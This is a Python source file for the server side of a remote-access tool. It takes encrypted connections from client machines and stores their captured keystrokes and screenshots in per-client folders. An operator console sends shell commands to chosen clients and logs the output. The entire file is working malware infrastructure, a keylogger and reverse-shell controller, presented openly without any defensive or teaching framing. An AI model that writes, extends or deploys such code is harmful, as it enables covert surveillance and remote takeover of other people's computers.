from datetime import datetime
import os
import select
import sys
import time
import protocol
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.primitives import serialization, hashes
import socket
import threading

# constants
IP = "192.168.3.17"
SAVED_CLIENTS_LOCATION = r'C:\Networks\pic'  # The path + filename where the

# Global variables
global clients
global clients_commands
clients = []
clients_commands = {}


def send_command_to_client(client_address, command):
    # check if client is connected and have a new command
    if client_address in clients:
        clients_commands[str(client_address)] = command
        data = "SERVER: Command sent to client\n Command: " + command 
        get_revers_shell_data(data, client_address)
    else:
        print("SERVER: Client not connected")


def reverse_shell():
    # create new command to the client and send it
    while True:
        if len(clients) > 0:
            command = input("Enter command: ")
            print("clients: ", clients)
            client_address = input("Enter client address: ")
            # print the console list of clients
            send_command_to_client(client_address, command)
        else:
            # sleep for 10 seconds
            time.sleep(10)


def delete_client(client_port):
    # remove the client from the clients list after disconnect
    try:
        clients.remove(client_port)
        clients_commands.pop(client_port, None)
    except ValueError:
        print("SERVER: Client not connected")


def create_dh_key():
    # Create a Diffie-Hellman client object
    parameters = dh.generate_parameters(generator=2, key_size=1024)
    param_bytes = parameters.parameter_bytes(serialization.Encoding.PEM, serialization.ParameterFormat.PKCS3)
    private_key = parameters.generate_private_key()
    public_key = private_key.public_key()
    return private_key, public_key, param_bytes


def handshake(client_socket, client_address):
    server_private_key, server_public_key, param_bytes = create_dh_key()
    print("SERVER: Client connected from: ", client_address)
    # Send the server's public key to the client and param_bytes
    client_socket.sendall(param_bytes)
    server_public_key_bytes = server_public_key.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo
    )
    client_socket.sendall(server_public_key_bytes)
    # Receive the client's public key
    client_public_key_bytes = client_socket.recv(1024)
    client_public_key = serialization.load_pem_public_key(client_public_key_bytes)
    # Derive the shared secret key using the client's public key
    shared_key = server_private_key.exchange(client_public_key)
    shared_key_digest = hashes.Hash(hashes.SHA256())
    shared_key_digest.update(shared_key)
    shared_key = shared_key_digest.finalize()
    clients.append(str(client_address[1]))
    return shared_key


def get_key_logger_pic(data, client_port):
    # get the pic from the client and save it
    new_path = SAVED_CLIENTS_LOCATION + '\\' + client_port
    if not os.path.isdir(new_path):
        os.mkdir(new_path)
    current_time = time.strftime("%Y%m%d-%H%M%S") + "_client_" + client_port
    with open(new_path + f"\\{current_time}.jpg", 'wb') as f:
        f.write(data)


def get_key_logger_data(data, client_port):
    # get the key logger data from the client and save it
    new_path = SAVED_CLIENTS_LOCATION + '\\' + client_port
    if not os.path.isdir(new_path):
        os.mkdir(new_path)
    with open(new_path + "\keyLog_" + client_port + ".txt", 'a') as f:
        f.write(data)


def get_revers_shell_data(data, client_port):
    # get the key logger data from the client and save it
    new_path = SAVED_CLIENTS_LOCATION + '\\' + client_port
    if not os.path.isdir(new_path):
        os.mkdir(new_path)
    # organize the data by client
    now = datetime.now()
    data = f'\n{now:%d/%m/%Y %H:%M:%S}\n {data}\n'
    # create a new file for each client
    with open(new_path + "\client_shell_" + client_port + ".txt", 'a') as f:
        f.write(data)


def handle_client(client_socket, client_address):
    try:
        shared_key = handshake(client_socket, client_address)
        client_port = str(client_address[1])
        print("client is now concenter: ", client_address[1])

        # Receive the encrypted data from the client
        while True:
            try:
                rlist, wlist, xlist = select.select([client_socket], [client_socket], [], 1)
                # Check if the socket is ready for reading
                if client_socket in rlist and client_port in clients:
                    # check the type of the message from the client
                    # 0 - disconnect
                    # 1 - key logger data
                    # 2 - key logger pic
                    # 3 - reverse shell
                    # 4 - info from the client
                    type_msg, data = protocol.get_type(client_socket, shared_key)

                    if not type_msg:
                        pass

                    if data == 0:
                        print("SERVER: Client disconnected")
                        break

                    elif data == 1:
                        message, data = protocol.get_msg(client_socket, shared_key)
                        if not message:
                            print("SERVER: Error in get_msg in key logger data")
                            break
                        get_key_logger_data(data.decode(), client_port)

                    elif data == 2:
                        message, data = protocol.get_msg(client_socket, shared_key, True)
                        if not message:
                            print("SERVER: Error in get_msg in key logger pic")
                            break
                        get_key_logger_pic(data, client_port)

                    elif data == 3:
                        message, data = protocol.get_msg(client_socket, shared_key)
                        if not message:
                            print("SERVER: Error in get_msg in reverse shell")
                            break
                        get_revers_shell_data(data.decode(), client_port)
                        print("\nREVERSE_SHELL: ", data.decode())

                    elif data == 4:
                        message, data = protocol.get_msg(client_socket, shared_key)
                        if not message:
                            print("SERVER: Error in get_msg in info message")
                            break
                        print("INFO: ", data)

                # Check if the socket is ready for writing
                if client_socket in wlist and client_port in clients:

                    if client_port in clients_commands.keys():
                        command = protocol.encode_message(clients_commands[client_port], shared_key)
                        # Send the encrypted data to the client
                        client_socket.sendall(command)
                        # delete the command from the dictionary
                        del clients_commands[client_port]

            except socket.error as e:
                print("SERVER: Error: ", e)
                client_socket.close()
                delete_client(client_port)
                break
    except Exception as e:
        print("SERVER: Error: ", e)
        client_socket.close()
        delete_client(client_port)
        # close the thread
        sys.exit()
        


def main():
    # global server_private_key, server_public_key, param_bytes
    # Create a Diffie-Hellman server object
    # server_private_key, server_public_key, param_bytes = create_dh_key()
    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Bind the socket to the port
    server_address = (IP, protocol.PORT)
    print('SERVER: starting up on %s port %s' % server_address)
    sock.bind(server_address)
    # Listen for incoming connections
    sock.listen(5)
    # Create a thread to handle the command to the client
    command_thread = threading.Thread(target=reverse_shell)
    command_thread.start()
    while True:
        try:
            # Wait for a connection
            print('SERVER: waiting for a connection\n')
            client_socket, client_address = sock.accept()
            # Create a thread to handle the client
            client_thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
            client_thread.start()
        except socket.error as e:
            print("SERVER: Error: ", e)
            pass


if __name__ == '__main__':
    main()
